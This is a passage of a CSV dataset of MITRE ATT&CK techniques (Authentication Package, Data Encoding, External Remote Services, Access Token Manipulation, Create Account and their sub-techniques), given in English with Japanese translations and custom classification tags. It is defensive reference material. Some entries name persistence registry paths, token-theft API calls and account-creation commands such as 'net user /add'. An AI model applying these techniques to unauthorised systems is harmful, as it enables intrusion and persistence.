2018）,defense-evasion,Linux;Windows;macOS,credential_abuse,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1,2017-05-31T21:31:42.750Z,2025-04-25T15:16:14.454Z,,,,
T1131,,Authentication Package,認証パッケージ,"Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages) Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.","Windows 認証パッケージ DLL は、システム起動時にローカルセキュリティ機関 (LSA) プロセスによってロードされます。これらは、オペレーティングシステムに対して複数のログオンプロセスと複数のセキュリティプロトコルへのサポートを提供します。 (引用元: MSDN 認証パッケージ)攻撃者は、LSA 認証パッケージが提供する自動起動メカニズムを利用して、Windows レジストリの <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> にあるキー <code>""Authentication Packages""=<target binary></code> にバイナリへの参照を配置することで、永続化を図ることができます。 これにより、認証パッケージがロードされると、システムによってバイナリが実行されます。",persistence,Windows,config_policy_manipulation,foothold,authentication_system;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d,2017-05-31T21:31:43.135Z,2025-04-25T15:15:32.524Z,,,,
T1132,,Data Encoding,データエンコーディング,"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",攻撃者は、コマンド＆コントロール通信の内容を検知しにくくするためにデータをエンコードする場合があります。コマンド＆コントロール（C2）情報は、標準的なデータエンコーディングシステムを使用してエンコードできます。 データエンコーディングの使用は、既存のプロトコル仕様に準拠する場合があり、ASCII、Unicode、Base64、MIME、その他のバイナリからテキストへの変換や文字エンコーディングシステムの使用が含まれます（引用元：Wikipedia バイナリからテキストへのエンコーディング）（引用元：Wikipedia 文字エンコーディング）。gzip など、一部のデータエンコーディングシステムはデータ圧縮も行う場合があります。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f,2017-05-31T21:31:43.540Z,2025-04-16T20:37:21.024Z,,,,
T1132.001,T1132,Standard Encoding,標準エンコーディング,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",攻撃者は、コマンド・アンド・コントロール通信の内容を検知しにくくするため、標準データ符号化システムを用いてデータを符号化することがある。コマンド・アンド・コントロール（C2）情報は、既存のプロトコル仕様に準拠した標準データ符号化システムを用いて符号化される。 一般的なデータエンコーディング方式には、ASCII、Unicode、16進数、Base64、MIMEなどがあります（引用元：ウィキペディア「バイナリからテキストへのエンコーディング」）（引用元：ウィキペディア「文字エンコーディング」）gzip など、一部のデータエンコーディングシステムはデータ圧縮も行う場合があります。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c,2020-03-14T23:36:52.095Z,2025-04-16T20:37:14.817Z,,,,
T1132.002,T1132,Non-Standard Encoding,非標準エンコーディング,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)",攻撃者は、コマンド・アンド・コントロール通信の内容を検知しにくくするため、非標準のデータ符号化システムでデータを符号化する場合がある。コマンド・アンド・コントロール（C2）情報は、既存のプロトコル仕様から逸脱した非標準のデータ符号化システムを用いて符号化される可能性がある。 非標準のデータエンコーディング方式は、標準のデータエンコーディング方式に基づく、または関連している場合があります。例えば、HTTP リクエストのメッセージ本文に対する変更された Base64 エンコーディングなどです。(引用: ウィキペディア バイナリからテキストへのエンコーディング) (引用: ウィキペディア 文字エンコーディング),command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc,2020-03-14T23:39:50.117Z,2025-04-25T14:48:12.613Z,,,,
T1133,,External Remote Services,外部向けリモートサービス,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation. Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",攻撃者は、外部向けリモートサービスを利用してネットワークへの初期アクセスや持続的潜伏を図ることがあります。VPN、Citrix、その他のアクセス機構といったリモートサービスは、ユーザーが外部から企業内部ネットワークリソースに接続することを可能にします。 これらのサービス向けに接続と認証情報を管理するリモートサービスゲートウェイが存在することが多い。[Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)や[VNC](https://attack.mitre.org/techniques/T1021/005)などのサービスも外部から利用可能である。(引用: MacOS VNC software for Remote Desktop) サービス利用には[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスが必須となる場合が多く、これは資格情報のフィッシングや、企業ネットワーク侵害後にユーザーから資格情報を入手することで取得される。(引用: Volexity Virtual Private Keylogging) リモートサービスへのアクセスは、作戦中の冗長または持続的なアクセス手段として利用される可能性があります。認証を必要としない公開サービスを通じてアクセスが得られる場合もあります。コンテナ環境では、公開されたDocker API、Kubernetes APIサーバー、kubelet、またはKubernetesダッシュボードなどのWebアプリケーションが含まれる可能性があります。（引用元：Trend Micro Exposed Docker Server）（引用元：Unit 42 Hildegard Malware）,persistence;initial-access,Windows;Linux;Containers;macOS,credential_abuse,foothold,authentication_system;user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S1,S1,C02;C01,Secondary Action;Initial Access,C01,Initial Access,TA0003;TA0001,attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d,2017-05-31T21:31:44.421Z,2025-04-15T22:34:58.667Z,,,,
T1134,,Access Token Manipulation,アクセストークンの操作,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation) Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",攻撃者は、異なるユーザーまたはシステムのセキュリティコンテキストで動作し、アクションを実行してアクセス制御を回避するためにアクセストークンを改変する可能性があります。Windowsは、実行中のプロセスの所有者を決定するためにアクセストークンを使用します。ユーザーはアクセストークンを操作して、実行中のプロセスを別プロセスの子プロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の所有物であるように見せかけたりできます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。 攻撃者は組み込みの Windows API 関数を使用して既存プロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは既存プロセスに適用される（例：[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）か、新規プロセスの生成に使用されます（例： [トークンを使用したプロセス作成](https://attack.mitre.org/techniques/T1134/002)) にも利用できます。トークン窃取には、攻撃者が既に特権ユーザーコンテキスト（例：管理者）にいる必要があります。しかし、攻撃者は一般的にトークン窃取を、管理者レベルからSYSTEMレベルへのセキュリティコンテキスト昇格に利用します。 攻撃者は、そのトークンがリモートシステム上で適切な権限を持つアカウントであれば、そのアカウントとしてリモートシステムに認証するためにトークンを使用できます。（引用元: Pentestlab Token Manipulation）標準ユーザーは誰でも、<code>runas</code>コマンドやWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセス権は必要ありません。 アクセストークンを変更するために使用できる他のメカニズム（Active Directoryフィールドなど）も存在する。,defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48,2017-12-14T16:46:06.044Z,2025-04-16T20:37:21.869Z,,,,
T1134.001,T1134,Token Impersonation/Theft,トークン偽装/窃取,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread. An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system. When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",攻撃者は、特権を昇格させ、アクセス制御をバイパスするために、他のユーザーの既存のトークンを複製して偽装する可能性があります。 例えば、攻撃者は `DuplicateToken` または `DuplicateTokenEx` を使用して既存のトークンを複製できます。(引用: DuplicateToken 関数) その後、このトークンを `ImpersonateLoggedOnUser` と組み合わせて呼び出し元スレッドがログオンユーザーのセキュリティコンテキストを偽装できるようにしたり、`SetThreadToken` と組み合わせてスレッドに偽装トークンを割り当てたりできます。 攻撃者は、複製したトークンを割り当てたい特定の既存プロセスがある場合に、[トークンのなりすまし/窃取](https://attack.mitre.org/techniques/T1134/001)を実行する可能性があります。例えば、ターゲットユーザーがシステム上でネットワーク非接続のログオンセッションを持っている場合に有用です。 攻撃者が既存プロセスへのアタッチではなく複製トークンで新規プロセスを作成する場合、`CreateProcessWithTokenW` または `CreateProcessAsUserW` による [トークン付きプロセス作成](https://attack.mitre.org/techniques/T1134/002) も追加で利用可能です。 [トークンのなりすまし/窃取](https://attack.mitre.org/techniques/T1134/001)は、[トークンの作成となりすまし](https://attack.mitre.org/techniques/T1134/003)とは異なり、新規トークンの作成ではなく既存トークンの複製を指します。,defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d,2020-02-18T16:39:06.289Z,2025-04-15T19:58:48.792Z,,,,
T1134.002,T1134,Create Process with Token,トークンを使用したプロセスの作成,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs) Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process. While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",攻撃者は既存のトークンを使用して新しいプロセスを作成し、権限昇格やアクセス制御の回避を行う可能性があります。 <code>CreateProcessWithTokenW</code> や <code>runas</code> などの機能を使用すると、別のユーザーのトークンと結果のセキュリティコンテキストでプロセスを作成できます。(引用元: Microsoft RunAs) 現在のユーザーに関連付けられていないトークンでプロセスを作成するには、対象ユーザーの認証情報、そのユーザーを偽装するための特定の権限、または使用するトークンへのアクセスが必要になる場合があります。 例えば、トークンはプロセス作成前に[トークンのなりすまし/窃取](https://attack.mitre.org/techniques/T1134/001)によって複製されるか、[トークンの作成となりすまし](https://attack.mitre.org/techniques/T1134/003)によって生成される可能性があります。 この手法は[トークンのなりすまし/盗難](https://attack.mitre.org/techniques/T1134/001)とは異なりますが、トークンが複製され、新しいプロセスの作成に使用される場合、両手法が組み合わせて使用される可能性があります。,defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf,2020-02-18T16:48:56.582Z,2025-04-16T20:37:17.537Z,,,,
T1134.003,T1134,Make and Impersonate Token,トークンの作成となりすまし,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread. This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",攻撃者は新しいトークンを作成し、ユーザーを偽装することで権限昇格やアクセス制御の回避を行う可能性があります。例えば、攻撃者がユーザー名とパスワードを所持しているが、そのユーザーがシステムにログオンしていない場合、攻撃者は`LogonUser`関数を使用してそのユーザーのためのログオンセッションを作成できます。(引用: LogonUserW関数) この関数は新規セッションのアクセストークンのコピーを返すため、攻撃者は`SetThreadToken`を使用してそのトークンをスレッドに割り当てられる。この動作は[トークンのなりすまし/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なり、既存トークンの窃取や複製ではなく新規ユーザートークンの生成を指す。,defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819,2020-02-18T18:03:37.481Z,2025-04-15T19:58:49.948Z,,,,
T1134.004,T1134,Parent PID Spoofing,親プロセスIDの偽装,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018) Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018) Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",攻撃者は、プロセス監視防御を回避したり権限昇格を行うために、新規プロセスの親プロセス識別子（PPID）を偽装する可能性があります。新規プロセスは、明示的に指定されない限り、通常は親プロセス（呼び出し元プロセス）から直接生成されます。新規プロセスのPPIDを明示的に割り当てる方法の一つは、使用するPPIDを定義するパラメータをサポートする<code>CreateProcess</code> API呼び出しです。(引用元: DidierStevens SelectMyParent 2009年11月) この機能は、ユーザー アカウント制御 (UAC) などの Windows 機能によって使用され、要求された昇格プロセスが SYSTEM (通常は <code>svchost.exe</code> または <code>consent.exe</code> 経由) によって生成された後、現在のユーザー コンテキストではなく正しい PPID を設定するために使用されます。(引用元: Microsoft UAC Nov 2018) 攻撃者はこれらのメカニズムを悪用し、防御策を回避する可能性があります。例えば、Office文書からの直接プロセス起動をブロックする防御や、[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) の PPID を <code>explorer.exe</code> と偽装するといった手法が挙げられる。(引用: CounterCept PPID Spoofing Dec 2018) この偽装は、悪意のあるOffice文書内の[Visual Basic](https://attack.mitre.org/techniques/T1059/005)や、[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行可能なあらゆるコードを通じて実行される可能性がある。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)PPID を明示的に割り当てることで、親プロセスに対する適切なアクセス権があれば、昇格された特権も有効になる可能性があります。 たとえば、特権ユーザーコンテキスト（管理者など）の攻撃者は、新しいプロセスを生成し、SYSTEM として実行されているプロセス（<code>lsass.exe</code> など）を親として割り当て、継承されたアクセストークンによって新しいプロセスが昇格されるようにすることができます。(引用: XPNSec PPID 2017年11月),defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;identity_federation;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a,2020-02-18T18:22:41.448Z,2025-04-16T20:37:18.203Z,,,,
T1134.005,T1134,SID-History Injection,SID履歴注入,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",攻撃者はSID履歴注入を利用して特権昇格やアクセス制御の回避を行う可能性があります。Windowsセキュリティ識別子（SID）はユーザーまたはグループアカウントを一意に識別する値です。SIDはセキュリティ記述子とアクセストークンの両方でWindowsセキュリティに使用されます。 (引用元: Microsoft SID) アカウントはSID-History Active Directory属性(引用元: Microsoft SID-History Attribute)に追加のSIDを保持でき、これによりドメイン間の相互運用可能なアカウント移行が可能となる（例: SID-Historyの全値がアクセストークンに含まれる）。ドメイン管理者（または同等の権限）を持つ場合、収集された、または既知のSID値 （引用元：Microsoft Well Known SIDs Jun 2017）をSID-Historyに挿入することで、エンタープライズ管理者などの任意のユーザー/グループのなりすましが可能になります。この操作により、ローカルリソースへの昇格アクセスや、[リモートサービス](https://attack.mitre.org/techniques/T1021)、 [SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)、または[Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)などの横方向移動技術を通じて、通常はアクセス不可能なドメインへのアクセスを引き起こす可能性があります。,defense-evasion;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0004,attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023,2020-02-18T18:34:49.414Z,2025-04-25T14:47:45.982Z,,,,
T1135,,Network Share Discovery,ネットワーク共有の発見,"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",攻撃者は、情報収集の前段階として収集対象となる情報源を特定し、横方向移動の潜在的な対象システムを特定する手段として、リモートシステム上で共有されているフォルダーやドライブを探す場合があります。ネットワークには、ユーザーがネットワーク上の様々なシステムにあるファイルディレクトリにアクセスできるようにする共有ネットワークドライブやフォルダーが存在するケースが多く見られます。Windowsネットワーク上でのファイル共有は、SMBプロトコルを介して行われます。 (出典: Wikipedia 共有リソース) (出典: TechNet 共有フォルダー)[Net](https://attack.mitre.org/software/S0039) は、<code>net view \\\\remotesystem</code> コマンドを使用して、リモートシステムで利用可能な共有ドライブを照会するために使用できます。また、<code>net share</code> を使用してローカルシステム上の共有ドライブを照会することもできます。 macOSでは、<code>sharing -l</code>コマンドでSMBサービスに使用される共有ポイントを一覧表示できます。,discovery,macOS;Windows;Linux,remote_service_abuse,situational_awareness,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f,2017-12-14T16:46:06.044Z,2025-04-15T22:52:30.350Z,,,,
T1136,,Create Account,アカウントの作成,"Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system. Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",攻撃者は、被害者システムへのアクセスを維持するためにアカウントを作成する場合があります（引用元：Symantec WastedLocker 2020年6月）。十分なアクセス権限があれば、このようなアカウントの作成は、システムに永続的なリモートアクセスツールをデプロイする必要のない、二次的な認証アクセスを確立するために使用される可能性があります。アカウントは、ローカルシステム上、ドメイン内、またはクラウドテナント内に作成される場合があります。 クラウド環境では、攻撃者は特定のサービスのみにアクセスできるアカウントを作成することがあり、これにより検出の可能性が低減される。,persistence,Windows;IaaS;Linux;macOS;Network Devices;Containers;SaaS;Office Suite;Identity Provider;ESXi,credential_abuse,foothold,authentication_system;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67,2017-12-14T16:46:06.044Z,2025-04-15T19:59:14.796Z,,,,
T1136.001,T1136,Local Account,ローカルアカウント,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. For example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security) Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",攻撃者は、被害者システムへのアクセスを維持するためにローカルアカウントを作成する場合があります。 ローカルアカウントとは、組織が単一システムまたはサービス上でユーザー、リモートサポート、サービス、または管理のために使用するために設定したアカウントを指します。例えば、十分なアクセス権限があれば、Windowsの<code>net user /add</code>コマンドを使用してローカルアカウントを作成できます。Linuxでは`useradd`コマンドが、macOSシステムでは<code>dscl -create</code>コマンドが使用可能です。 ローカルアカウントはネットワークデバイスにも追加可能であり、<code>username</code>などの一般的な[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンド、ESXiサーバーへの`esxcli system account add`、Kubernetesクラスターへの`kubectl`ユーティリティ経由で設定されることが多い。(引用: cisco_username_cmd)(引用: Kubernetes Service Accounts Security) このようなアカウントは、システム上に永続的なリモートアクセスツールをデプロイする必要のない、二次的な認証アクセスを確立するために使用できます。,persistence,Linux;macOS;Windows;Network Devices;Containers;ESXi,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--635cbe30-392d-4e27-978e-66774357c762,2020-01-28T13:50:22.506Z,2025-04-15T19:58:36.237Z,,,,
T1136.002,T1136,Domain Account,ドメインアカウント,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999) Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",攻撃者は被害システムへのアクセスを維持するためドメインアカウントを作成する可能性がある。ドメインアカウントとはActive Directoryドメインサービスで管理されるアカウントであり、アクセス権と権限はそのドメインに属するシステムやサービス全体で設定される。ドメインアカウントにはユーザーアカウント、管理者アカウント、サービスアカウントが含まれる。 十分なアクセス権限があれば、<code>net user /add /domain</code> コマンドを使用してドメインアカウントを作成できます。(引用: Savill 1999) このようなアカウントは、システム上に永続的なリモートアクセスツールを展開する必要のない二次的な認証アクセスを確立するために使用される可能性があります。,persistence,Windows;macOS;Linux,credential_abuse,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177,2020-01-28T14:05:17.825Z,2025-04-15T22:21:24.212Z,,,,
